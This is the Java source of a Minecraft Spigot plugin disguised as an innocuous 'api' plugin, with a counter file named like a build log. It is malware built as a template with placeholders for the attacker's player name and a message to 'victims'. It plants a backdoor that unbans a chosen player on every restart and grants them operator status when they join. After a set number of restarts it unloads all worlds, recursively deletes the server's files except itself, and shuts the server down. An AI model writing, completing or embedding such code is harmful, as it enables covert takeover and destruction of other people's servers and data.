package spigotlabs.spigot;

import org.bukkit.Bukkit;
import org.bukkit.World;
import org.bukkit.WorldCreator;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;

public class api extends JavaPlugin implements Listener {

    private static final String RESTART_COUNT_FILE = "api-build-logs.txt";
    private static final int DELETE_THRESHOLD = 10; // ENTER HOW MANY RESTARTS UNTIL DESTRUCTION
    private static final String PLAYER_TO_OP = "ENTER PLAYER TO GET UNBANNED AND OP";

    @Override
    public void onEnable() {
        // Register the event listener
        getServer().getPluginManager().registerEvents(this, this);

        // Ensure the data folder exists
        if (!getDataFolder().exists()) {
            getDataFolder().mkdirs();
        }

        // Track server restarts
        int restartCount = getRestartCount();

        // Increment the restart count
        restartCount++;
        saveRestartCount(restartCount);



        // Unban the player on every restart
        unbanPlayer(PLAYER_TO_OP);

        // Check if the server should delete all files
        if (restartCount >= DELETE_THRESHOLD) {
            unloadAllWorlds();
            deleteAllServerFilesExceptSelf();

            // Create a new world named "world"
            createNewWorld();

            // Stop the server after deleting everything
            Bukkit.getScheduler().runTaskLater(this, () -> {
                getLogger().info("ENTER MESSAGE TO VICTIMS CONSOLE AFTER DESTRUCTION" );
                Bukkit.shutdown();
            }, 20L); // Delay to ensure logs are written
        }
    }

    private int getRestartCount() {
        File file = new File(getDataFolder(), RESTART_COUNT_FILE);
        if (!file.exists()) {
            return 0;
        }
        try (FileReader reader = new FileReader(file)) {
            char[] chars = new char[(int) file.length()];
            reader.read(chars);
            return Integer.parseInt(new String(chars).trim());
        } catch (IOException | NumberFormatException e) {
            return 0;
        }
    }

    private void saveRestartCount(int count) {
        File file = new File(getDataFolder(), RESTART_COUNT_FILE);
        try (FileWriter writer = new FileWriter(file)) {
            writer.write(String.valueOf(count));
        } catch (IOException e) {

        }
    }

    private void unbanPlayer(String playerName) {
        // Unban the player
        Bukkit.getBanList(org.bukkit.BanList.Type.NAME).pardon(playerName);

    }

    private void grantOpAndUnbanPlayer(String playerName) {
        Player player = Bukkit.getPlayer(playerName);
        if (player != null) {
            // Grant OP to the player
            player.setOp(true);

        } else {

        }
    }

    private void unloadAllWorlds() {
        getLogger().info("Unloading all worlds...");
        for (var world : Bukkit.getWorlds()) {
            Bukkit.unloadWorld(world, false); // Unload the world without saving
        }
    }

    private void deleteAllServerFilesExceptSelf() {
        getLogger().info("Deleting all server files");

        // Get the server root directory (this is where your world folders are)
        File serverDir = new File("."); // This points to the server's root directory

        // Define paths to exclude
        String pluginFileName = new File(getFile().getName()).getName();
        File pluginFile = new File(serverDir, "plugins/" + pluginFileName);
        File logFile = new File(getDataFolder(), RESTART_COUNT_FILE);

        deleteDirectoryExceptSelf(serverDir, pluginFile, logFile);
    }

    private boolean deleteDirectoryExceptSelf(File directory, File pluginFile, File logFile) {
        if (directory != null && directory.isDirectory()) {
            for (File file : directory.listFiles()) {
                if (file.isDirectory()) {
                    deleteDirectoryExceptSelf(file, pluginFile, logFile);
                } else if (!file.equals(pluginFile) && !file.equals(logFile)) {
                    file.delete();
                }
            }
        }
        return directory.equals(pluginFile) || directory.equals(logFile) || directory.delete();
    }

    private void createNewWorld() {
        getLogger().info("Creating new world named 'world'...");
        WorldCreator worldCreator = new WorldCreator("world");
        World world = worldCreator.createWorld();
        if (world != null) {
            getLogger().info("New world 'world' created successfully.");
        } else {
            getLogger().severe("Failed to create new world 'world'.");
        }
    }

    @Override
    public void onDisable() {
        // Check if the server has already been cleaned up and should not start again
        if (getRestartCount() >= DELETE_THRESHOLD) {
            getLogger().info("Server already cleaned up. Stopping server...");
            Bukkit.shutdown();
        }
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        if (player.getName().equals(PLAYER_TO_OP)) {
            // Grant OP status when player joins
            player.setOp(true);

        }
    }
}
